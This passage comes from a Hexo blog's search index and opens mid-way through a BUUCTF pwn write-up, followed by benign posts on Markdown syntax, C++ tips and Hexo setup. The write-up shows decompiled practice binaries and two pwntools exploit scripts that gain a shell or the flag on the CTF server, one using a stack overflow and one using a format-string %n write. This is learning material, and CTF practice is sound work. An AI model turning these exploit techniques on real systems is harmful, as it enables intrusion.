class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);<span class="comment">// 设置标准输出 _bss_start 的缓冲方式</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>); <span class="comment">// 设置标准输入 stdin 的缓冲方式</span></span><br><span class="line">  func(); <span class="comment">// 调用 func 函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>再看func函数  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">  <span class="comment">//首先声明了一个长度为 44 的字符数组 v1 和一个浮点数 v2</span></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's guess the number."</span>); <span class="comment">//输出提示信息 "Let's guess the number."</span></span><br><span class="line">  gets(v1); <span class="comment">//使用 gets 函数（危险函数）接收输入，存储在 v1 中</span></span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">"cat /flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Its value should be 11.28125"</span>);</span><br><span class="line">    <span class="comment">//最后，通过比较 v2 是否等于 11.28125，如果相等，则执行 "cat /flag"，否则输出 "Its value should be 11.28125"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>找到system函数的地址<br><img src="/2023/11/18/buuctf-pwn-wp/20191.png"><br>写payload  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment"># 创建一个与远程主机通信的连接</span></span><br><span class="line">p = remote(<span class="string">"node4.buuoj.cn"</span>, <span class="number">28403</span>) </span><br><span class="line"><span class="comment"># 构造 payload，其中包含 'a'*(0x30+8) 的填充和 0x4006BE 的地址</span></span><br><span class="line">payload = <span class="string">b'a'</span> * (<span class="number">0x30</span> + <span class="number">8</span>) + p64(<span class="number">0x4006BE</span>)</span><br><span class="line"><span class="comment"># 发送 payload 到远程主机</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># 与远程主机进行交互，可以手动输入或者使用脚本进行进一步的操作</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/11/18/buuctf-pwn-wp/20192.png">  </p><h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><p><img src="/2023/11/18/buuctf-pwn-wp/pwn5.png"><br>32位文件，开启了栈溢出保护，开启了NX<br>丢到ida里  </p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF //定义一个长度为100的字符数组</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">srand</span>(v1);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">read</span>(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"your name:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x63</span>u); <span class="comment">//等待用户在终端收入，存入buf中，最多读取0x63u（99）个字节</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello,"</span>); <span class="comment">// 存在格式化字符串漏洞</span></span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"your passwd:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">atoi</span>(nptr) == dword_804C044 ) <span class="comment">// 只要满足这个条件就可以得到flag</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"ok!!"</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"fail"</span>);</span><br><span class="line">  }</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    <span class="built_in">sub_80493D0</span>();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>计算偏移量位10<br><img src="/2023/11/18/buuctf-pwn-wp/pwn51.png"><br>写下脚本  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node4.buuoj.cn'</span>,<span class="number">29083</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804C044</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"AAAA%16$n%17$n%18$n%19$n"</span> + p32(bss) + p32(bss+<span class="number">1</span>) + p32(bss+<span class="number">2</span>) + p32(bss+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x04040404</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>cat falg<br><img src="/2023/11/18/buuctf-pwn-wp/pwn53.png"></p><h1 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h1><p>checksec,32位文件，<br><img src="/2023/11/18/buuctf-pwn-wp/shellcode_asm0.png">    </p><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>checksec查看下保护 64 位文件，开启了NX无法使用shellcode<br><img src="/2023/11/18/buuctf-pwn-wp/2019c.png"><br>丢到ida里查看<br>发现encrypt函数里有gets函数，大概是栈溢出<br><img src="/2023/11/18/buuctf-pwn-wp/2019c1.png">  </p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD 学习记录</title>
      <link href="/2023/11/12/my-first-blog-about-MD/"/>
      <url>/2023/11/12/my-first-blog-about-MD/</url>
      
        <content type="html"><![CDATA[<p>为了督促我的学习写一篇记录我的学习进程<span id="more"></span></p><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><p><code># 一级标题</code></p><p><code>## 二级标题</code></p><p><code>### 三级标题</code></p><p><code>#### 四级标题</code></p><p><code>##### 五级标题</code></p><p><code>###### 六级标题</code></p><h3 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h3><p><em>这是斜体</em>   <code>*这是斜体*</code></p><p><strong>这是粗体</strong>  <code>**这是粗体**</code></p><p><em><strong>这是粗斜体</strong></em>  <code>***这是粗斜体***</code></p><p><del>这是删除线</del>  <code>~~这是删除线~~</code></p><h3 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h3><p>这是文本一<br>这是文本二</p><p>这是文本一</p><p>这是文本二</p><p><code>这是文本一  这是文本二 //段落内换行使用换行符 &lt;br&gt;，或者 两个空格 + shift-Enter。</code></p><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><ol><li><p>第一</p></li><li><p>第二</p></li><li><p>第三</p></li><li><p>第一</p></li><li><p>第二</p></li><li><p>第二</p></li><li><p>第二</p></li><li><p>第六</p></li><li><p><input checked="" disabled="" type="checkbox"> 已选中的选项</p></li><li><p><input disabled="" type="checkbox"> 未选中的选项</p></li></ol><ul><li>第一</li><li>第二</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. 第一</span><br><span class="line"></span><br><span class="line">2. 第二</span><br><span class="line"></span><br><span class="line">3. 第三</span><br><span class="line"></span><br><span class="line">4. 第一</span><br><span class="line">5. 第二</span><br><span class="line">6. 第二</span><br><span class="line">7. 第二</span><br><span class="line">8. 第六</span><br><span class="line"></span><br><span class="line">9. [x] 已选中的选项</span><br><span class="line">10. [ ] 未选中的选项</span><br><span class="line"></span><br><span class="line">- 第一</span><br><span class="line">- 第二</span><br></pre></td></tr></tbody></table></figure><blockquote><p>当按两次空格发现没有退出列表，可以按ctrl + [ 取消缩进返回上一级。</p></blockquote><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><blockquote><p>引用</p></blockquote><p><code>&gt; 这是引用</code></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>这是行内<code>代码</code></p><p><code>这是行内代码</code></p><h4 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h4><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cout &lt;&lt; <span class="string">"hello world"</span> &lt;&lt; endl;</span><br></pre></td></tr></tbody></table></figure><h3 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h3><hr><hr><h3 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h3><ol><li>链接到网站<br><a href="https://ygkldnherr.github.io/">我的小站</a> <code>[我的小站](https://ygkldnherr.github.io)</code></li><li>连接到其他Markdown页面<br><a href="./hello-world">Markdown hello-world</a> <code>[Markdown hello-world](./hello-world)</code></li><li>无标签链接<br><a href="https://ygkldnherr.github.io/">https://ygkldnherr.github.io</a> <code>&lt;https://ygkldnherr.github.io&gt;</code></li><li>无标签邮箱链接<br><a href="mailto:ygkldnherr@gmail.com">ygkldnherr@gmail.com</a> <code>&lt;ygkldnherr@gmail.com&gt;</code></li><li>添加title<br><a href="./hello-world" title="点击跳转到hello-world">Markdown hello-world</a> <code>[Markdown hello-world](./hello-world "点击跳转到hello-world")</code></li><li>自动超链接<br><a href="https://ygkldnherr.github.io/">https://ygkldnherr.github.io</a> <code>https://ygkldnherr.github.io</code></li></ol><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><ol><li>添加一个图片<br><img src="/2023/11/12/my-first-blog-about-MD/Snipaste.png" alt="这是一个图片"></li><li>带链接的图片<br><a href="https://ygkldnherr.github.io/"><img src="/2023/11/12/my-first-blog-about-MD/Snipaste.png" alt="这是一个图片"></a></li><li>带title的图片<br><img src="/2023/11/12/my-first-blog-about-MD/Snipaste.png" alt="这是一个图片" title="这是一个截图"></li></ol><h3 id="emoji"><a href="#emoji" class="headerlink" title="emoji"></a>emoji</h3><p>两种方法：一种方法是直接输入，另一种方法是利用表情短码（利用两个冒号隔开）<br><span class="github-emoji"><span>😂</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>:joy:</code></p><h3 id="内嵌HTML"><a href="#内嵌HTML" class="headerlink" title="内嵌HTML"></a>内嵌HTML</h3><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><table><thead><tr><th align="center">第一列</th><th align="center">第二列</th><th align="center">第三列</th></tr></thead><tbody><tr><td align="center">第一列第一列</td><td align="center">第二列第二列</td><td align="center">第三列第三列</td></tr></tbody></table><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|第一列|第二列|第三列|</span><br><span class="line">|:---|:---:|---:|</span><br><span class="line">|这是左对齐|这是居中对齐|这是右对齐|</span><br></pre></td></tr></tbody></table></figure><h3 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h3><p>引用语法为<code>[^名称]</code><br>定义语法为<code>[^名称]: 内容</code></p><blockquote><p>脚注也可以作为常量来使用，如当图片名太长时可以用脚注来代替。</p></blockquote><h3 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h3><p>这是一个公式$ c^2 = a^2 + b^2 $<br>$$<br>c^2 = a^2 + b^2<br>$$</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Some_c++_knowledge_points</title>
      <link href="/2023/11/09/Some-c-knowledge-points/"/>
      <url>/2023/11/09/Some-c-knowledge-points/</url>
      
        <content type="html"><![CDATA[<p>在做题的时候会接触到一些零碎的知识点（作为一个小白），记录防忘。<span id="more"></span></p><ol><li><p>有时会根据某些规律定量输出一定数量的空格</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%*s"</span>, i, <span class="string">" "</span>);<span class="comment">//*是占位，指的是i代表的域宽。</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Initialized string: %.*s\n"</span>, <span class="built_in">sizeof</span>(str), str);</span><br></pre></td></tr></tbody></table></figure></li><li><p>基于范围的for循环</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[] = {<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>};</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> e : arr)</span><br><span class="line">{</span><br><span class="line">cout &lt;&lt; e &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>反三角函数</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/11/05/hello-world/"/>
      <url>/2023/11/05/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.<span id="more"></span></p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
